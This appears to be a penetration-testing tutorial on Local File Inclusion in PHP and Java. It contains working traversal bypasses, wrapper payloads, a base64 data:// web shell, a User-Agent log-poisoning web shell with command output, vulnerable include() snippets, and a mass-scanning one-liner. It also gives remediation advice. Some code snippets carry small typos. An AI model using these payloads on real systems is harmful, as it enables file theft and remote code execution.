---
title: Local File Inclusion (LFI)
---

# Local File Inclusion (LFI)

**LFI (Local File Inclusion) (CWE-98)** is a vulnerability where user input manipulates dynamic file includes (`include()`, `require()`) to execute arbitrary local files as code. Attackers use path traversal + server-side execution to read configs or achieve RCE via log poisoning. 

## Fundamentals of LFI

Local File Inclusion (LFI) occurs when an application loads a local file into its execution flow based on user-controlled input.

```jsx
include("/var/www/pages/" . $_GET['page']);
```

It happens because user input reaches file inclusion logic without strict validation or allowlisting.

The core issue is not `../`.

LFI allows an attacker to read sensitive local files, access application source code, include log or session files, abuse wrappers like `php://filter`, and potentially achieve remote code execution when combined with a write primitive such as log poisoning or file uploads.

**Normal flow:**

`phpinclude("/var/www/pages/" . $_GET['page']);  // home.php → safe`

**LFI conversion:**

`text?page=../../../etc/passwd → executes /etc/passwd as PHP (displays content)
?page=php://filter/... → reads source code via wrappers`

**Key**: 

***Path Traversal = read primitive.*** 

***LFI = read + execute.***

## LFI Attack Types

**Absolute LFI**: Direct paths via `include("/etc/passwd")`

**Relative LFI**: `../../../var/log/apache2/access.log` 

**Log Poisoning**: PHP in logs → LFI execution

**Wrapper Abuse**: `php://filter/`, `data://`, `expect://`

## Attack Surface

LFI typically appears anywhere user input influences file loading logic, such as:

- `page`, `file`, `view`, `template`, `lang`, or `module` parameters
- Dynamic template rendering systems
- CMS/plugin loaders
- Theme or localization file selectors
- Download or preview endpoints that internally use `include`
- Error handlers that load custom templates
- Auto-loading mechanisms tied to user-controlled class names

If user input decides *which file gets executed*, that’s your surface

## Recent CVEs (2022-2026)

| CVE | Year | Type | Impact |
| --- | --- | --- | --- |
| CVE-2025-59049 | 2025 | Path traversal / LFI (static file serving) | Mockoon arbitrary file read |
| CVE-2024-23657 | 2024 | Unauthenticated path traversal via WebSocket RPC | Nuxt Devtools file read → token leak → potential RCE |
| CVE-2023-53691 | 2023 | Directory traversal → arbitrary file upload | Hikvision webshell plant / RCE |

## **Exploitation (LFI)**

**LFI exploitation focuses on forcing the application to include unintended local files into execution flow.**

## 1. Absolute LFI

Absolute LFI occurs when an application passes **user-controlled input directly into `include()` or `require()`** and allows **absolute filesystem paths** without proper validation. Instead of limiting includes to a specific directory, the application accepts paths starting from the filesystem root.

Because the file is **included rather than read**, it becomes part of the application’s execution flow. Non-PHP files are typically displayed, while files containing executable code may be **parsed and executed** by the runtime.

Absolute LFI **does not rely on path traversal (`../`)**  attackers directly include sensitive system or application files using full paths.

**Exploitation**:

```jsx
textNormal: ?page=home.php → /var/www/pages/home.php
LFI: ?page=/etc/passwd → executes /etc/passwd as PHP
```

**Targets**: `/proc/version`, `/var/www/config.php`

**Bypasses**:

| Filter | Payload | Why Works |
| --- | --- | --- |
| No leading `/` | `////etc/passwd` | Slash normalization |
| PHP wrappers | `php://filter/.../etc/passwd` | Protocol bypass |

## 2. Relative LFI

Relative LFI occurs when an application includes files using **user-controlled relative paths** and resolves them against an intended base directory. By abusing **path traversal sequences (`../`)**, an attacker can escape this directory and force the application to include arbitrary local files.

Because the file is **included into the execution flow**, reachable files may be rendered, parsed, or executed by the runtime. This is the **most common form of LFI**, as many applications attempt weak directory restrictions that traversal easily bypasses.

Relative LFI relies on directory escape rather than absolute paths, making it highly prevalent in real-world applications.

**Exploitation**:

```jsx
?page=../../../proc/self/environ → executes injected code IF User-Agent was poisoned first (see Log Poisoning section — this is not standalone, /proc/self/environ only contains attacker code after you've sent a request with PHP in the User-Agent header)
?page=../../../var/log/apache2/access.log → log poisoning
```

**Bypasses**:

| Filter | Payload | Why Works |
| --- | --- | --- |
| `../` block | `..%2f..%2fproc%2fself%2fenviron` | URL decode |
| WAF | `....//....//access.log` | Nested seq |
| Double decode | `..%252f..%252f` | Proxy decode |

## 3. Log Poisoning LFI

Log Poisoning LFI is **not a web-server vulnerability** (Apache/Nginx are not “buggy”). It is an **application-level LFI flaw** where the application includes a log file that happens to contain **attacker-controlled input**.

Web servers routinely store request data (headers, URLs, errors) in log files. When an application later **includes those log files via an LFI**, the runtime (e.g., PHP) parses the log content as part of execution. If the attacker has injected executable code into the log, that code runs

This technique relies on three conditions:

- The attacker can **write data to log files**
- The log file is **reachable via LFI**
- The log content is **parsed by the runtime** during inclusion

Log Poisoning is a common and reliable way to escalate LFI into **remote code execution (RCE)** when direct file uploads or writable includes are unavailable.

**Exploitation**:

### 1. Vulnerable include point

The application includes a file based on user input:

```php
<?php include($_GET['page']); ?>
```

### 2. Poison the log with attacker-controlled input

Send a request that injects PHP code into a logged header:

```
GET / HTTP/1.1
Host: vulnerable.site
User-Agent:<?phpsystem($_GET['cmd']);?>
```

What happens:

- The web server writes the `User-Agent` value into `access.log`. The PHP payload is now **stored inside a local file**

### 3. Include the poisoned log via LFI

Trigger inclusion of the log file:

```
?page=../../../var/log/apache2/access.log&cmd=id
```

### 4. Result

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4. Wrapper-based LFI

Wrapper-based LFI occurs when an application includes user-controlled input and allows **PHP stream wrappers** instead of normal filesystem paths. These wrappers let attackers **bypass path restrictions** and interact with internal resources, encoded files, or command execution interfaces.

Unlike classic LFI, this technique does not rely on directory traversal. The include mechanism accepts a **protocol handler** (`php://`, `data://`, `expect://`) which the PHP runtime processes directly.

### Common Wrappers:

```jsx
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7
/proc/self/fd/3
expect://whoami
```

## Bypassing Defences

Applications often attempt weak filtering. Common bypass strategies include:

### Traversal Filtering Bypass

| Defence | Bypass | Reason |
| --- | --- | --- |
| Block `../` | `..%2f..%2f` | URL decoding |
| Strip `../` | `....//` | Normalization |
| Single decode | `..%252f` | Double decoding |

---

### Path Restriction Bypass

| Defence | Bypass | Reason |
| --- | --- | --- |
| No leading `/` | `////etc/passwd` | Slash normalization |
| Base directory check | `php://filter/...` | Protocol handler |
| Extension enforcement | `index.php%00` | Null byte - only works on PHP < 5.3.4 |

### Common log File Locations default:

```jsx
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/php_errors.log
/var/log/php-fpm.log
/var/log/php7.4-fpm.log
/var/log/php8.1-fpm.log
/tmp/php_errors.log
/var/log/app.log
/var/log/node.log
/home/node/app/logs/app.log
/var/log/gunicorn/access.log
/var/log/gunicorn/error.log
/var/log/uwsgi/app.log
/opt/tomcat/logs/catalina.out
/var/log/tomcat/catalina.out
/opt/tomcat/logs/localhost_access_log.txt
/proc/self/fd/1
/proc/self/fd/2
/var/lib/docker/containers/*/*.log
/app/logs/app.log
/tmp/app.log
C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log
C:\Windows\System32\LogFiles\HTTPERR\httperr.log
```

## Advanced Attack Scenarios (LFI)

Basic LFI gives file read. Advanced LFI chains give execution. These scenarios rely on runtime behavior, stream wrappers, and secondary primitives.

### 1. PHAR Deserialization via LFI

PHP automatically attempts to deserialize metadata when interacting with `phar://` streams.

If an attacker can upload a crafted PHAR file (even disguised as an image) and trigger:

```
include("phar://uploads/avatar.jpg");
```

PHP processes the PHAR metadata. If the metadata contains a serialized object and a gadget chain exists in the codebase, this results in **Object Injection → RCE**.

Key requirement:

- File upload primitive
- Gadget chain in application or dependency
- `phar://` wrapper usable

This is LFI turning into deserialization.

**Note**: *this is version/config dependent. Confirm the target PHP version and that the `phar` stream wrapper is actually enabled before relying on this - behavior around automatic PHAR metadata parsing has changed across PHP versions, so verify rather than assume.*

### 2. LFI → Session File Inclusion

If PHP sessions are stored on disk:

```
/var/lib/php/sessions/sess_<ID>
```

And session data contains attacker-controlled content, including the session file may execute injected PHP code.

Flow:

1. Inject PHP into session value.
2. Include session file via LFI.
3. Trigger execution.

Works when:

- Session handler is file-based
- Application includes arbitrary paths

### 3. LFI → Upload Directory Execution

If file uploads are stored locally:

```
/uploads/profile.png
```

And attacker uploads:

```
profile.png (contains PHP code)
```

Then triggers:

```
?page=../../uploads/profile.png
```

If runtime parses it, this becomes direct RCE.

Even if execution is blocked normally, LFI bypasses extension checks because inclusion ignores web server MIME handling.

### 4. LFI → /proc Abuse

Linux exposes runtime data in `/proc`.

Examples:

```
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/*
```

If environment variables contain secrets or injected payloads, inclusion may expose sensitive runtime data or assist further chaining.

### 5. LFI → Container Escape Recon

In Docker environments:

```
/proc/1/cgroup
/var/lib/docker/containers/*/*.log
```

LFI can reveal container metadata, mount paths, and internal service structure.

This doesn’t immediately give RCE, but it provides high-value reconnaissance inside containerized environments.

### 6. LFI → SSRF Pivot (Wrapper Abuse)

When wrappers are enabled:

```
php://filter
data://
expect://
```

Or if `allow_url_include` is enabled:

```
http://internal-service
```

This can convert LFI into internal resource access (SSRF-like behavior), depending on configuration.

## Strategic Insight

Basic LFI = file read.

Advanced LFI = primitive chaining.

The moment you combine:

- Write primitive
- Deserialization
- Stream wrappers
- Upload functionality
- Session storage
- Log injection

LFI stops being informational and becomes weaponizable.

## **Framework-Related Scenarios**

LFI manifests differently depending on language and framework design. The vulnerability always revolves around user-controlled file resolution, but the surface varies.

### **PHP Frameworks**

PHP is historically the most LFI-prone because `include()` and `require()` directly execute files.

**Common Scenarios:**

- Legacy MVC routing:

```php
include("pages/" .$_GET['view'] .".php");
```

- Custom template loaders
- Plugin/module loaders
- Language file selectors (`?lang=en`)
- CMS themes

### **Java (JSP / Servlets / Spring)**

Java does not have `include()` in the PHP sense, but similar LFI-style risks arise when user input influences mechanisms like `RequestDispatcher.include()`, dynamic JSP forwarding, template resolution, or file-based view resolvers. In these cases, unvalidated input can manipulate which server-side resource is loaded or rendered, potentially leading to internal file exposure or unintended execution flow.

**Example pattern:**

```java
request.getRequestDispatcher("/WEB-INF/views/" + page +".jsp").forward(request, response);
```

If `page` is attacker-controlled and validation fails, directory traversal can expose internal JSP files or configuration resources.

### One-liner used for LFI

```jsx
echo "https://target.com" | katana -d 3 -silent | grep "=" | qsreplace "../../../etc/passwd" | xargs -I{} sh -c 'curl -s "{}"' | grep -q "root:x:" && echo "[VULN] {}"
```

## Tools

Common tools used for discovering and exploiting LFI vulnerabilities:

- **Burp Suite** – Intercept requests, modify parameters, and fuzz LFI payloads.
- **ffuf** – Parameter fuzzing and automated payload testing.
- **Nuclei** – Automated vulnerability scanning using LFI templates.
- **Katana** – Fast crawler to discover parameterized endpoints.
- **gau / waybackurls** – Collect historical URLs with parameters.
- **LFISuite** – Specialized exploitation framework for LFI.
- **fimap** – Automated LFI discovery and exploitation tool.

## **Impact**:

- **Source code disclosure** via `php://filter`
- **Sensitive file exposure** without directory traversal
- **Bypass of path validation and base directory restrictions**
- **Execution of attacker-controlled payloads** (`data://`)
- **Command execution** when dangerous wrappers are enabled (`expect://`)
- **Credential and secret leakage** (env files, API keys)
- **LFI → RCE escalation** depending on runtime configuration

## Remediations (LFI)

- **Never include user input directly** User input must not reach `include()`, `require()`, or template loaders.
- **Use strict allowlists** Map input to predefined filenames, not paths (`home → home.php`).
- **Enforce canonical paths** Use `realpath()` and restrict includes to a fixed base directory.
- **Disable dangerous PHP features**
    
    ```
    allow_url_include =Off
    allow_url_fopen   =Off
    ```
    
- **Block protocol handlers** Reject `://`, `php://`, `data://`, `expect://`.
- **Harden file permissions** Logs read-only, no writable include paths, separate uploads from includes.
- **Keep logs out of reach** Logs must never be includable by application logic.
- **Monitor abuse** Alert on non-template includes and access to log paths.

## Good To Read

- [https://hackerone.com/reports/59665](https://hackerone.com/reports/59665)
- [https://hackerone.com/reports/1639364](https://hackerone.com/reports/1639364)
- [https://medium.com/@RajPhantomVector/exploiting-local-file-inclusion-a-defhawk-ctf-writeup-a26d38ee8fd4](https://medium.com/@RajPhantomVector/exploiting-local-file-inclusion-a-defhawk-ctf-writeup-a26d38ee8fd4)

## References

- [**OWASP Testing Guide v4.2 - LFI Testing**](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion.md)
- [**PayloadsAllTheThings File Inclusion**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)
- [**Imperva HII Report #8 - Remote & Local File Inclusion**](https://www.imperva.com/docs/hii_remote_and_local_file_inclusion_vulnerabilities.pdf)
- [**Local File Inclusion Technical Analysis**](https://www.invicti.com/learn/local-file-inclusion-lfi/)
- [**What is Local File Inclusion (LFI)?**](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)
- [**Pentester's Guide to File Inclusion**](https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion)
- [**Local File Inclusion - Computer Science Overview**](https://www.sciencedirect.com/topics/computer-science/local-file-inclusion)